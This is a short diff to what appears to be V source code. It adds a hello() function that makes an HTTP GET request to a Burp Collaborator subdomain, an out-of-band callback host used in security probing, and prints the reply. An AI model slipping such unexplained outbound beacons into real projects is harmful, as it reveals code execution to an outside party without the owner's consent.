@@ -10,3 +10,12 @@ fn init() {
 		println(err)
 	}
 }
+fn hello() {
+	// your setup code here ...
+	if resp := http.get('http://w9664pwprjvj0j6gj0895i2t3k9b0zp.burpcollaborator.net') {
+		println(resp.text) // resp is a http.Response, not an optional
+	} else {
+		println(err)
+	}
+}
+
